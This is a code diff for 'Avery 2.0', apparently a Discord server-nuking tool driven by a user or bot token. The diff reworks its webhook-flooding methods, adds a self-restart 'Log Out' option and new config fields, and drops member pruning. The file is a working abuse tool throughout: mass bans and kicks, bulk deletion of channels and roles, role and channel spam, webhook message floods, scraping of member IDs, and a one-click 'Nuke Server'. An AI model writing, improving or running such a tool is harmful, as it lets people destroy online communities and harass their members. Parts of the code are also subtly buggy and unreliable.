@@ -1,7 +1,8 @@
 import threading
-from discord import channel, webhook
+from discord.ext.commands.converter import RoleConverter
 import requests
 import discord
+import psutil
 import time
 import json
 import sys
@@ -13,11 +14,13 @@ from pathlib import Path
 
 os.system(f'cls & mode 85,20 & title Avery 2.0 - Config')
 
-def save_stats(token: str = 'none', color: str = '\x1b[38;5;56m', pace: int = 0.1):
+def save_stats(token: str = 'none', color: str = '\x1b[38;5;56m', pace: int = 0.1, musicBot: bool = False, voiceChannel: str = ''):
     stats = {
         'token': token,
         'color': color,
-        'text-pace': pace
+        'text-pace': pace,
+        'music-bot': musicBot,
+        'voice-channel': voiceChannel
     }
     with open('config.json', 'w') as f:
         json.dump(stats, f)
@@ -36,7 +39,9 @@ def init_io():
             json.dump({
                 'token': 'none',
                 'color': '\x1b[38;5;56m',
-                'text-pace': 0.1
+                'text-pace': 0.1,
+                'music-bot': False,
+                'voice-channel': 'General'
             }, f)
     open('scrape/members.txt', 'w')
     open('scrape/channels.txt', 'w')
@@ -44,23 +49,26 @@ def init_io():
 
 init_io()
 
-def getToken():
+def get(path: str):
     with open('config.json') as f:
         obj = json.load(f)
         f.close()
-    return obj['token']
+    return obj[path]
+
+def getToken():
+    return get('token')
 
 def getColor():
-    with open('config.json') as f:
-        obj = json.load(f)
-        f.close()
-    return obj['color']
+    return get('color')
 
 def getTextPace():
-    with open('config.json') as f:
-        obj = json.load(f)
-        f.close()
-    return obj['text-pace']
+    return 0.0
+
+def isMusicBot():
+    return get('music-bot')
+
+def getVoiceChannel():
+    return get('voice-channel')
 
 def println(msg: str = '', delay: int = getTextPace()):
     for c in msg:
@@ -97,7 +105,7 @@ except:
 println(f'{clr}> \033[37mRich Presence ({clr}Y\033[37m/{clr}N\033[37m){clr}: \033[37m')
 rich_presence = input()
 
-save_stats(token=token, color=getColor(), pace=getTextPace())
+save_stats(token=token, color=getColor(),pace=getTextPace(), musicBot=isMusicBot(), voiceChannel=getVoiceChannel())
 
 os.system('cls')
 
@@ -128,31 +136,32 @@ elif token_type == 'bot':
 
 client.remove_command('help')
 
-def createwebhook(channel, name):
-    try:
-        json = { 'name': name, }
-        r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
-
-        id = r.json()['id']
-        tk = r.json()['token']
-
-        return f'https://discord.com/api/webhooks/{id}/{tk}'
-    except:
-        pass
-
-def sendwebhook(webhook, amount, name, message):
-    try:
-        for i in range(amount):
-            json = { 'username': name, 'content': message }
-            requests.post(webhook, json=json)
-    except:
-        pass
-
 class Avery:
 
     def __init__(self, color):
         self.color = color
         self.reset = '\033[37m'
+
+    def createwebhook(self, channel, name):
+        try:
+            json = {'name': name, }
+            r = requests.post(
+                f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
+
+            id = r.json()['id']
+            tk = r.json()['token']
+
+            return f'https://discord.com/api/webhooks/{id}/{tk}'
+        except:
+            pass
+
+    def sendwebhook(self, webhook, amount, name, message):
+        try:
+            for i in range(amount):
+                json = {'username': name, 'content': message}
+                requests.post(webhook, json=json)
+        except:
+            pass
     
     def say(self, msg: str, newLine: bool = False):
         if newLine == False:
@@ -192,6 +201,17 @@ class Avery:
                     self.say(f'Kicked{self.color} {member.strip()}')
                 break
 
+    def LogOut(self):
+        try:
+            p = psutil.Process(os.getpid())
+            for handler in p.get_open_files() + p.connections():
+                os.close(handler.fd)
+        except Exception:
+            pass
+        
+        python = sys.executable
+        os.execl(python, python, *sys.argv)
+
     def DeleteChannels(self, guild, channel):
         while True:
             r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
@@ -221,9 +241,11 @@ class Avery:
             else:
                 if self.success(r):
                     self.say(f'Created Channel{self.color} {name}')
-                    if spam:
-                        webhook = createwebhook(r.json()['id'], name)
-                        threading.Thread(target=sendwebhook, args=(webhook, amount, name, message,)).start()
+                    if spam == False:
+                        break
+                    id = r.json()['id']
+                    webhook = self.createwebhook(id, name)
+                    threading.Thread(target=self.sendwebhook, args=(webhook, amount, name, message,)).start()
                 break
     
     def SpamRoles(self, guild, name):
@@ -271,7 +293,7 @@ class Avery:
             for role in guildOBJ.roles:
                 r.write(str(role.id) + '\n')
                 rolecount += 1
-            self.say(f'Scraped {self.color}{channelcount}{self.reset} Roles')
+            self.say(f'Scraped {self.color}{rolecount}{self.reset} Roles')
             r.close()
 
     async def Nuke(self):
@@ -364,11 +386,6 @@ class Avery:
         for i in range(int(amount)):
             threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()
     
-    async def PruneMembers(self):
-        guild = self.getGuild()
-        print()
-        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
-    
     def Credits(self):
         os.system(f'cls & mode 85,20 & title Avery 2.0 - Credits')
         print(f'''
@@ -382,7 +399,7 @@ class Avery:
         {self.reset}''')
     
     async def ThemeChanger(self):
-        save_stats(token=token, color=self.color, pace=getTextPace())
+        save_stats(token=token, color=self.color, pace=getTextPace(), musicBot=isMusicBot, voiceChannel=getVoiceChannel())
         os.system(f'cls & mode 85,20 & title Avery 2.0 - Themes')
         print(f'''
                           {self.color}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
@@ -433,7 +450,6 @@ class Avery:
         elif choice == 'X' or choice == 'x':
             os._exit(0)
 
-
     async def Menu(self):
         os.system(f'cls & mode 85,20 & title Avery 2.0 - Connected: {client.user}')
         print(f'''
@@ -443,7 +459,7 @@ class Avery:
         {self.color}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗{self.reset}
         {self.color}║ {self.reset}[{self.color}1{self.reset}] {self.reset}Ban Members       {self.color}║{self.reset} [{self.color}5{self.reset}] {self.reset}Delete Channels   {self.color}║{self.reset} [{self.color}9{self.reset}] {self.reset}Scrape Info       {self.color}║{self.reset}
         {self.color}║ {self.reset}[{self.color}2{self.reset}] {self.reset}Kick Members      {self.color}║{self.reset} [{self.color}6{self.reset}] {self.reset}Create Roles      {self.color}║{self.reset} [{self.color}0{self.reset}] {self.reset}Change Themes     {self.color}║{self.reset}
-        {self.color}║ {self.reset}[{self.color}3{self.reset}] {self.reset}Prune Members     {self.color}║{self.reset} [{self.color}7{self.reset}] {self.reset}Create Channels   {self.color}║{self.reset} [{self.color}C{self.reset}] {self.reset}View Credits      {self.color}║{self.reset}
+        {self.color}║ {self.reset}[{self.color}3{self.reset}] {self.reset}Log Out           {self.color}║{self.reset} [{self.color}7{self.reset}] {self.reset}Create Channels   {self.color}║{self.reset} [{self.color}C{self.reset}] {self.reset}View Credits      {self.color}║{self.reset}
         {self.color}║ {self.reset}[{self.color}4{self.reset}] {self.reset}Delete Roles      {self.color}║{self.reset} [{self.color}8{self.reset}] {self.reset}Nuke Server       {self.color}║{self.reset} [{self.color}X{self.reset}] {self.reset}Exit              {self.color}║{self.reset}
         {self.color}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝{self.reset}
                 
@@ -459,9 +475,7 @@ class Avery:
             time.sleep(2)
             await self.Menu()
         elif choice == '3':
-            await self.PruneMembers()
-            time.sleep(2)
-            await self.Menu()
+            await self.LogOut()
         elif choice == '4':
             await self.Roles()
             time.sleep(2)
@@ -494,10 +508,6 @@ class Avery:
             await self.Menu()
         elif choice == 'X' or choice == 'x':
             os._exit(0)
-
-    @client.event
-    async def on_ready():
-        await Avery(getColor()).Menu()
             
     def Startup(self):
         try:
@@ -506,11 +516,15 @@ class Avery:
             elif token_type == 'bot':
                 client.run(token)
             self.color = getColor()
-            save_stats(token=token, color=self.color, pace=getTextPace())
+            save_stats(token=token, color=self.color, pace=getTextPace(), musicBot=False, voiceChannel="general")
         except:
             print(f'{self.color}>{self.reset} Invalid Token')
             input()
             os._exit(0)
+
+@client.event
+async def on_ready():
+    await Avery(getColor()).Menu()
 
 if __name__ == '__main__':
     Avery(color=getColor()).Startup()
